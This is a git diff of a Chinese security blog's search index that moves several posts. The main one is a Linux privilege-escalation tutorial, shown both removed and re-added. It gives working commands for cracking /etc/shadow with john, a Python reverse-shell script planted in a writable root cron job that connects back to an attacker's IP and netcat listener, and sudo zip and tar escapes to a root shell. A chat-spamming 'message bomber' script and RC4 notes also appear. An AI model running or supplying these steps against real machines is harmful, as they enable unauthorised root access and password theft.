-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/passwd /etc/shadow</span><br><span class="line">unshadow passwd shadow &gt; cracked</span><br><span class="line">john cracked </span><br></pre></td></tr></table></figure>
-
-<h1 id="四、计划任务"><a href="#四、计划任务" class="headerlink" title="四、计划任务"></a>四、计划任务</h1><p>&emsp;&emsp;系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。<strong>非root权限的用户是不可以列出root用户的计划任务的。但是/etc/内系统的计划任务可以被列出</strong></p>
-<p>&emsp;&emsp;使用命令：<code>cat /etc/crontab</code> 回车查看计划任务</p>
-<p>&emsp;&emsp; 默认这些程序以root权限执行，<strong>如果有幸遇到一个把其中脚本配置成任意用户可写的管理员，我们就可以修改脚本等回连root shell</strong>；如果定时执行的文件是py脚本，可以使用以下的脚本来替换之前的脚本：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> os,subprocess,socket</span><br><span class="line">s=socket.socekt(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;攻击机IP地址&quot;</span>,<span class="string">&quot;攻击机监听端口&quot;</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;攻击机启动nc监听端口：<code>nc -nlvp port</code></p>
-<h1 id="五、密码复用"><a href="#五、密码复用" class="headerlink" title="五、密码复用"></a>五、密码复用</h1><p>&emsp;&emsp;很多管理员会重复使用密码，因此数据库或者web后台的密码也许就是root密码。</p>
-<p>&emsp;&emsp;有了（疑似)） root密码怎么办？你一定想ssh登陆。然而ssh很可能禁止root登陆，或是防火墙规则将你排除在外了。返回来想，我们不是有一个低权shell了吗？找个办法在上面“输入”密码就好了。显然，直接在低权shell里面用sudo是不奏效的。这是因为出于安全考虑linux要求用户必须从终端设备（tty）中输入密码，而不是标准输入(stdin）。换句话说，sudo在你输入密码的时候本质上是读取了键盘，而不是bash里面输入的字符。因此为了能够输入密码，我们必须模拟一个终端设备。python就有这样的功能。在shell里面输入：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="六、zip、rar提权"><a href="#六、zip、rar提权" class="headerlink" title="六、zip、rar提权"></a>六、zip、rar提权</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo –l 发现可以使用root执行zip和tar命令</span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;利用zip进行提权</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">touch exploit     新建exploit文件</span><br><span class="line">sudo -u root zip exploit.zip exploit -T -unzip -<span class="built_in">command</span>=<span class="string">&quot;sh -c /bin/bash&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;利用tar进行提权</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u root tar cf /dev/null exploit -checkpoint=1 --checkpoint -action=<span class="string">&quot;/bin/bash&quot;</span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>内网安全</category>
-      </categories>
-      <tags>
-        <tag>提权</tag>
-        <tag>内网安全</tag>
       </tags>
   </entry>
   <entry>
@@ -2491,6 +2420,77 @@
       </tags>
   </entry>
   <entry>
+    <title>Linux提权的各种姿势</title>
+    <url>/post/927dc08e.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、提权介绍"><a href="#一、提权介绍" class="headerlink" title="一、提权介绍"></a>一、提权介绍</h1><p>&emsp;&emsp;往往我们能拿下服务器的web服务只是具有低权限用户(www-data)，对于内网渗透，我们需要提权到root。Linux系统的提权过程不止涉及到了漏洞，也涉及了很多系统配置。</p>
+<ul>
+<li><p>提权前提:  </p>
+<ul>
+<li><p>已经拿到低权shell</p>
+</li>
+<li><p>被入侵的机器上面有nc，python，perl等linux非常常见的工具</p>
+</li>
+<li><p>有权限上传文件和下载文件</p>
+</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1639064411988-b659f170-ddff-496a-ad83-34975effb1ac.jpeg" alt="img"></p>
+<h1 id="二、内核漏洞提权"><a href="#二、内核漏洞提权" class="headerlink" title="二、内核漏洞提权"></a>二、内核漏洞提权</h1><p>&emsp;&emsp;内核漏洞是我们几乎最先想到的提权方法。通杀的内核漏洞是十分少见的，因而我们应该先对系统相关的信息进行收集</p>
+<ol>
+<li>查看发行版本：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br><span class="line">lsb_release -a</span><br><span class="line">cat /etc/lsb-release</span><br><span class="line">cat /etc/redhat-release</span><br><span class="line">dmesg | grep Linux</span><br><span class="line">ls /boot | grep vmlinuz</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>查看内核版本：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">uname -a</span><br><span class="line">cat /proc/version</span><br><span class="line">uname -mrs</span><br><span class="line">rpm -q kernel</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1639063157058-0f0fff10-3514-4725-bec9-4f3b28636a50.png" alt="img"></p>
+<ol start="3">
+<li>找到系统版本号，通过kali的searchsploit查找该版本是否存在漏洞</li>
+</ol>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1639063175462-bbbb593e-42dc-4455-bc22-23e5b8fdcbd6.png" alt="img"></p>
+<ol start="4">
+<li><p>发现不存在内核溢出代码</p>
+</li>
+<li><p>假若存在内核溢出代码，可通过如下命令，上传内核溢出代码，编译执行</p>
+</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc xxx.c -o exploit [-lpthread]</span><br><span class="line">chmod +x exploit</span><br><span class="line">./exploit</span><br></pre></td></tr></table></figure>
+
+<h1 id="三、明文root提权-通过passwd和shadow破译密码"><a href="#三、明文root提权-通过passwd和shadow破译密码" class="headerlink" title="三、明文root提权-通过passwd和shadow破译密码"></a>三、明文root提权-通过passwd和shadow破译密码</h1><p>&emsp;&emsp;大多linux系统的密码都和/etc/passwd和/etc/shadow这两个配置文件息息相关。passwd里面储存了用户，shadow里面是密码的hash。出于安全考虑passwd是全用户可读，root可写的。shadow是仅root可读写的。</p>
+<p>&emsp;&emsp;例如破解linux用户名和对应的密码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/passwd /etc/shadow</span><br><span class="line">unshadow passwd shadow &gt; cracked</span><br><span class="line">john cracked </span><br></pre></td></tr></table></figure>
+
+<h1 id="四、计划任务"><a href="#四、计划任务" class="headerlink" title="四、计划任务"></a>四、计划任务</h1><p>&emsp;&emsp;系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。<strong>非root权限的用户是不可以列出root用户的计划任务的。但是/etc/内系统的计划任务可以被列出</strong></p>
+<p>&emsp;&emsp;使用命令：<code>cat /etc/crontab</code> 回车查看计划任务</p>
+<p>&emsp;&emsp; 默认这些程序以root权限执行，<strong>如果有幸遇到一个把其中脚本配置成任意用户可写的管理员，我们就可以修改脚本等回连root shell</strong>；如果定时执行的文件是py脚本，可以使用以下的脚本来替换之前的脚本：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> os,subprocess,socket</span><br><span class="line">s=socket.socekt(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;攻击机IP地址&quot;</span>,<span class="string">&quot;攻击机监听端口&quot;</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;攻击机启动nc监听端口：<code>nc -nlvp port</code></p>
+<h1 id="五、密码复用"><a href="#五、密码复用" class="headerlink" title="五、密码复用"></a>五、密码复用</h1><p>&emsp;&emsp;很多管理员会重复使用密码，因此数据库或者web后台的密码也许就是root密码。</p>
+<p>&emsp;&emsp;有了（疑似)） root密码怎么办？你一定想ssh登陆。然而ssh很可能禁止root登陆，或是防火墙规则将你排除在外了。返回来想，我们不是有一个低权shell了吗？找个办法在上面“输入”密码就好了。显然，直接在低权shell里面用sudo是不奏效的。这是因为出于安全考虑linux要求用户必须从终端设备（tty）中输入密码，而不是标准输入(stdin）。换句话说，sudo在你输入密码的时候本质上是读取了键盘，而不是bash里面输入的字符。因此为了能够输入密码，我们必须模拟一个终端设备。python就有这样的功能。在shell里面输入：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="六、zip、rar提权"><a href="#六、zip、rar提权" class="headerlink" title="六、zip、rar提权"></a>六、zip、rar提权</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo –l 发现可以使用root执行zip和tar命令</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;利用zip进行提权</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">touch exploit     新建exploit文件</span><br><span class="line">sudo -u root zip exploit.zip exploit -T -unzip -<span class="built_in">command</span>=<span class="string">&quot;sh -c /bin/bash&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;利用tar进行提权</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u root tar cf /dev/null exploit -checkpoint=1 --checkpoint -action=<span class="string">&quot;/bin/bash&quot;</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>内网安全</category>
+      </categories>
+      <tags>
+        <tag>提权</tag>
+        <tag>内网安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PHP检查相等时的漏洞</title>
     <url>/post/a645df71.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、PHP弱类型-的漏洞"><a href="#一、PHP弱类型-的漏洞" class="headerlink" title="一、PHP弱类型==的漏洞"></a>一、PHP弱类型==的漏洞</h1><h2 id="1、原理"><a href="#1、原理" class="headerlink" title="1、原理"></a>1、原理</h2><p><strong>注：这些漏洞适用于所有版本的PHP</strong></p>
@@ -2643,6 +2643,30 @@
       </tags>
   </entry>
   <entry>
+    <title>Python实现消息轰炸机</title>
+    <url>/post/5ab8ed9d.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>&emsp;&emsp;解放双手，让电脑来帮我们自动发一些我们想要发的消息，挺省力的，比如说我们想恶搞好朋友，那么我们就可以用脚本来实现自动复制、粘贴和发送文字的功能，从而解放我们自己，不用亲自在电脑上反复干这个<code>Ctrl C</code>/<code>Ctrl V</code>这个累活儿。</p>
+<p>&emsp;&emsp;还可以把定时多长时间后发送指定内容，这下子就不用坐在电脑前面到点了发弹幕了。</p>
+<h1 id="第一步：获取聊天窗口位置"><a href="#第一步：获取聊天窗口位置" class="headerlink" title="第一步：获取聊天窗口位置"></a>第一步：获取聊天窗口位置</h1><p>&emsp;&emsp;在我们发消息之前，得需要知道聊天窗口的位置在哪，即鼠标停留在哪里才能定位到聊天窗口的输入界面，也就是鼠标的x和y坐标是多少。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pyautogui <span class="keyword">as</span> pag</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Press Ctrl-C to stop&quot;</span>)</span><br><span class="line">        x, y = pag.position()</span><br><span class="line">        positionStr = <span class="string">&quot;(&quot;</span> + <span class="built_in">str</span>(x).rjust(<span class="number">4</span>) + <span class="string">&quot;,&quot;</span> + <span class="built_in">str</span>(y).rjust(<span class="number">4</span>) + <span class="string">&quot;)&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(positionStr)</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        os.system(<span class="string">&#x27;cls&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;end...&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;只要程序运行起来之后，每当我们移动鼠标，鼠标的x和y值就会自动发生改变并打印出来，我们只需要把聊天窗口调出来，把鼠标定位到聊天的窗口的输入位置就能获取到此时的x和y值。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636813473499-546b1119-f7ab-4dbf-b424-ec28c2ec1ec3.png" alt="img"></p>
+<h1 id="第二步：实现自动发送消息"><a href="#第二步：实现自动发送消息" class="headerlink" title="第二步：实现自动发送消息"></a>第二步：实现自动发送消息</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pyautogui</span><br><span class="line"><span class="keyword">import</span> pyperclip</span><br><span class="line">content = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">我爱你</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">list</span>(content.split(<span class="string">&quot;\n&quot;</span>))*<span class="number">10</span>:<span class="comment">#发送10次文本</span></span><br><span class="line">    <span class="keyword">if</span> line:</span><br><span class="line">        pyautogui.click(<span class="number">801</span>, <span class="number">730</span>)  <span class="comment">#鼠标点击并定位到聊天窗口</span></span><br><span class="line">        pyperclip.copy(line)    <span class="comment">#复制该行</span></span><br><span class="line">        pyautogui.hotkey(<span class="string">&quot;ctrl&quot;</span>,<span class="string">&quot;v&quot;</span>) <span class="comment">#粘贴，mac电脑则把ctrl换成command</span></span><br><span class="line">        pyautogui.typewrite(<span class="string">&quot;\n&quot;</span>)   <span class="comment">#发送</span></span><br><span class="line">        time.sleep(<span class="number">0.1</span>) <span class="comment">#每次发完间隔0.1s</span></span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;先运行第一步的代码确定坐标，然后运行第二步实施自动发送</p>
+<h1 id="改良版"><a href="#改良版" class="headerlink" title="改良版"></a>改良版</h1><p>Github：<a href="https://github.com/LeeJony000/Message_bomber">https://github.com/LeeJony000/Message_bomber</a></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636819405073-fdf5f514-6c63-4317-a440-257c90f222be.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+        <tag>爬虫</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Portainer可视化面板安装</title>
     <url>/post/2f19e9de.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul>
@@ -2669,91 +2693,6 @@
       </categories>
       <tags>
         <tag>docker</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Python实现消息轰炸机</title>
-    <url>/post/5ab8ed9d.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>&emsp;&emsp;解放双手，让电脑来帮我们自动发一些我们想要发的消息，挺省力的，比如说我们想恶搞好朋友，那么我们就可以用脚本来实现自动复制、粘贴和发送文字的功能，从而解放我们自己，不用亲自在电脑上反复干这个<code>Ctrl C</code>/<code>Ctrl V</code>这个累活儿。</p>
-<p>&emsp;&emsp;还可以把定时多长时间后发送指定内容，这下子就不用坐在电脑前面到点了发弹幕了。</p>
-<h1 id="第一步：获取聊天窗口位置"><a href="#第一步：获取聊天窗口位置" class="headerlink" title="第一步：获取聊天窗口位置"></a>第一步：获取聊天窗口位置</h1><p>&emsp;&emsp;在我们发消息之前，得需要知道聊天窗口的位置在哪，即鼠标停留在哪里才能定位到聊天窗口的输入界面，也就是鼠标的x和y坐标是多少。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pyautogui <span class="keyword">as</span> pag</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Press Ctrl-C to stop&quot;</span>)</span><br><span class="line">        x, y = pag.position()</span><br><span class="line">        positionStr = <span class="string">&quot;(&quot;</span> + <span class="built_in">str</span>(x).rjust(<span class="number">4</span>) + <span class="string">&quot;,&quot;</span> + <span class="built_in">str</span>(y).rjust(<span class="number">4</span>) + <span class="string">&quot;)&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(positionStr)</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        os.system(<span class="string">&#x27;cls&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;end...&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;只要程序运行起来之后，每当我们移动鼠标，鼠标的x和y值就会自动发生改变并打印出来，我们只需要把聊天窗口调出来，把鼠标定位到聊天的窗口的输入位置就能获取到此时的x和y值。</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636813473499-546b1119-f7ab-4dbf-b424-ec28c2ec1ec3.png" alt="img"></p>
-<h1 id="第二步：实现自动发送消息"><a href="#第二步：实现自动发送消息" class="headerlink" title="第二步：实现自动发送消息"></a>第二步：实现自动发送消息</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pyautogui</span><br><span class="line"><span class="keyword">import</span> pyperclip</span><br><span class="line">content = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">我爱你</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">list</span>(content.split(<span class="string">&quot;\n&quot;</span>))*<span class="number">10</span>:<span class="comment">#发送10次文本</span></span><br><span class="line">    <span class="keyword">if</span> line:</span><br><span class="line">        pyautogui.click(<span class="number">801</span>, <span class="number">730</span>)  <span class="comment">#鼠标点击并定位到聊天窗口</span></span><br><span class="line">        pyperclip.copy(line)    <span class="comment">#复制该行</span></span><br><span class="line">        pyautogui.hotkey(<span class="string">&quot;ctrl&quot;</span>,<span class="string">&quot;v&quot;</span>) <span class="comment">#粘贴，mac电脑则把ctrl换成command</span></span><br><span class="line">        pyautogui.typewrite(<span class="string">&quot;\n&quot;</span>)   <span class="comment">#发送</span></span><br><span class="line">        time.sleep(<span class="number">0.1</span>) <span class="comment">#每次发完间隔0.1s</span></span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;先运行第一步的代码确定坐标，然后运行第二步实施自动发送</p>
-<h1 id="改良版"><a href="#改良版" class="headerlink" title="改良版"></a>改良版</h1><p>Github：<a href="https://github.com/LeeJony000/Message_bomber">https://github.com/LeeJony000/Message_bomber</a></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636819405073-fdf5f514-6c63-4317-a440-257c90f222be.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>Python</tag>
-        <tag>爬虫</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>RC4加密算法</title>
-    <url>/post/9dd1bdb.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>&emsp;&emsp;RC4加密算法是一种对称加密算法</p>
-<h1 id="一、对称加密算法"><a href="#一、对称加密算法" class="headerlink" title="一、对称加密算法"></a>一、对称加密算法</h1><p>&emsp;&emsp;对称加密(也叫私钥加密)指加密和解密使用相同<a href="http://baike.baidu.com/view/934.htm">密钥</a>的加密算法。有时又叫传统密码算法，就是加密密钥能够从解密密钥中推算出来，同时解密密钥也可以从加密密钥中推算出来。而在大多数的对称算法中，加密密钥和解密密钥是相同的，所以也称这种加密算法为秘密密钥算法或单密钥算法。它要求发送方和接收方在安全通信之前，商定一个密钥。对称算法的安全性依赖于密钥，泄漏密钥就意味着任何人都可以对他们发送或接收的消息解密，所以密钥的保密性对通信的安全性至关重要。 </p>
-<h1 id="二、RC4加密算法"><a href="#二、RC4加密算法" class="headerlink" title="二、RC4加密算法"></a>二、RC4加密算法</h1><h2 id="1、预备知识"><a href="#1、预备知识" class="headerlink" title="1、预备知识"></a>1、预备知识</h2><h3 id="（1）异或"><a href="#（1）异或" class="headerlink" title="（1）异或"></a>（1）异或</h3><p>&emsp;&emsp;学习RC4加密算法之前，首先要知道：<strong>对明文使用同一个密钥异或两次最后是得到原文的</strong></p>
-<h3 id="（2）流密码"><a href="#（2）流密码" class="headerlink" title="（2）流密码"></a>（2）流密码</h3><h4 id="①-定义"><a href="#①-定义" class="headerlink" title="① 定义"></a>① 定义</h4><p>&emsp;&emsp;流密码是对称密码算法，从明文输入流逐位或逐字节产生密文输出。</p>
-<p>&emsp;&emsp;流密码类似于“一次一密”，不同的是“一次一密”使用的是真正的随机数流，而流密码使用的是伪随机数流。</p>
-<h4 id="②-实例"><a href="#②-实例" class="headerlink" title="② 实例"></a>② 实例</h4><p>&emsp;&emsp;使用最广泛的流密码是RC4</p>
-<h4 id="③-流密码结构"><a href="#③-流密码结构" class="headerlink" title="③ 流密码结构"></a>③ 流密码结构</h4><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638015605787-f3c732e3-7fb2-42bf-ad9a-46141b10a8b1.png" alt="img"></p>
-<h4 id="④-设计流密码的主要因素"><a href="#④-设计流密码的主要因素" class="headerlink" title="④ 设计流密码的主要因素"></a>④ 设计流密码的主要因素</h4><ol>
-<li><p>加密序列的周期要长，若出现重复的周期过短，容易被破解</p>
-</li>
-<li><p>密钥流应该尽可能地接近真正随机数流的特征</p>
-</li>
-<li><p>密钥长度要长，以避免穷举攻击</p>
-</li>
-</ol>
-<h2 id="2、RC4算法介绍"><a href="#2、RC4算法介绍" class="headerlink" title="2、RC4算法介绍"></a>2、RC4算法介绍</h2><p>&emsp;&emsp;RC4算法是Ron Rivest为RSA公司在1987年设计的一种流密码，作为RSA的商业机密直到1994年才被匿名公布于Internet。</p>
-<p>&emsp;&emsp;该算法是一个可变密钥长度、面向字节操作的流密码。该算法以<strong>随机置换</strong>作为<strong>基础</strong>，其密码周期很可能大于10100，且该算法的运行速度很快。</p>
-<p>&emsp;&emsp;RC4被用于为网络浏览器和服务器间通信而制定的SSL/TLS（安全套接字协议/传输层安全协议）标准中，以及作为IEEE 801.11无线局域网标准一部分的WEP(Wired Equivalent Privacy)协议和新的WiFi受保护访问协议（WPA）中<strong>。****从这些应用来看，RC4构成了当今网络通信的非常重要的部分，因此这个算法非常重要。</strong></p>
-<p>&emsp;&emsp;RC4算法的特点是算法简单，运行速度快，而且密钥长度是可变的，可变范围为1-256字节(8-2048比特)，在如今技术支持的前提下，当密钥长度为128比特时，用暴力法搜索密钥已经不太可行，所以可以预见RC4的密钥范围任然可以在今后相当长的时间里抵御暴力搜索密钥的攻击。实际上，如今也没有找到对于128bit密钥长度的RC4加密算法的有效攻击方法。  </p>
-<h2 id="3、RC4加密原理"><a href="#3、RC4加密原理" class="headerlink" title="3、RC4加密原理"></a>3、RC4加密原理</h2><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638015993488-6e14d89f-c789-4c1b-b5b2-5c431304f2d9.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638018567039-e5fed088-41f6-4467-8f34-52543c690500.png" alt="img"></p>
-<p>&emsp;&emsp;RC4算法的原理很简单，包括<strong>初始化算法（KSA）</strong>和**伪随机子密码生成算法（PRGA)**两大部分。</p>
-<h3 id="（1）初始化算法（KSA）"><a href="#（1）初始化算法（KSA）" class="headerlink" title="（1）初始化算法（KSA）"></a>（1）初始化算法（KSA）</h3><h4 id="①-初始化状态向量S（256字节，用来作为密钥流生成的种子1）"><a href="#①-初始化状态向量S（256字节，用来作为密钥流生成的种子1）" class="headerlink" title="① 初始化状态向量S（256字节，用来作为密钥流生成的种子1）"></a>① 初始化状态向量S（256字节，用来作为密钥流生成的种子1）</h4><p>&emsp;&emsp;按照升序，给每个字节赋值0,1,2,3,4,5,6……,254,255</p>
-<h4 id="②-初始密钥（由用户输入），长度任意"><a href="#②-初始密钥（由用户输入），长度任意" class="headerlink" title="② 初始密钥（由用户输入），长度任意"></a>② 初始密钥（由用户输入），长度任意</h4><p>&emsp;&emsp;建立一个临时向量T。将密钥的值循环复制到T向量如果输入长度小于256个字节，则进行轮转，直到填满</p>
-<ul>
-<li>例如输入密钥的是1,2,3,4,5，那么填入的是1,2,3,4,5,1,2,3,4,5,1,2,3,4,5……</li>
-</ul>
-<p>&emsp;&emsp;<strong>由上述轮转过程得到256个字节的向量T（用来作为密钥流生成的种子2）</strong></p>
-<h4 id="③-开始对状态向量S进行置换操作（用来打乱初始种子1）"><a href="#③-开始对状态向量S进行置换操作（用来打乱初始种子1）" class="headerlink" title="③ 开始对状态向量S进行置换操作（用来打乱初始种子1）"></a>③ 开始对状态向量S进行置换操作（用来打乱初始种子1）</h4><p>&emsp;&emsp;按照下列规则进行，从第零个字节开始，执行256次，保证每个字节都得到处理</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)&#123;</span><br><span class="line">    j = (j + S[i] + T[i]) mod <span class="number">256</span>;</span><br><span class="line">    swap(S[i],S[j]);</span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;因为对S的操作仅是交换，S仍然包含所有值为0-255的元素。</p>
-<h3 id="（3）密钥流的生成与加密"><a href="#（3）密钥流的生成与加密" class="headerlink" title="（3）密钥流的生成与加密"></a>（3）密钥流的生成与加密</h3><p>&emsp;&emsp;假设我的明文字节数是datalength=1024个字节（当然可以是任意个字节）</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">i=<span class="number">0</span>;</span><br><span class="line">j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(datalength--)&#123; <span class="comment">// 相当于执行1024次，这样生成的密钥流也是1024个字节</span></span><br><span class="line">    i = (i+<span class="number">1</span>)mod256;</span><br><span class="line">    j = (j+S[i])mod256;</span><br><span class="line">    swap(S[i],S[j]);</span><br><span class="line">    t = (S[i]+S[j])mod256;</span><br><span class="line">    k = S[t]; 这里的k就是当前生成的一个密钥流中的一位</span><br><span class="line">    <span class="comment">// 可以直接在这里进行加密，当然也可以将密钥流保存在数组中，最后进行异或就ok</span></span><br><span class="line">    data[] = data[]^k;  <span class="comment">// 进行加密，^是异或运算符</span></span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;解密按照前面写的，异或两次就是原文，所以只要把密钥流重新拿过来异或一次就能得到原文了</p>
-<h1 id="三、完整算法实现"><a href="#三、完整算法实现" class="headerlink" title="三、完整算法实现"></a>三、完整算法实现</h1><h2 id="1、C"><a href="#1、C" class="headerlink" title="1、C"></a>1、C</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//程序开始</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> longULONG;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*初始化函数*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*s, <span class="keyword">unsigned</span> <span class="keyword">char</span>*key, <span class="keyword">unsigned</span> <span class="keyword">long</span> 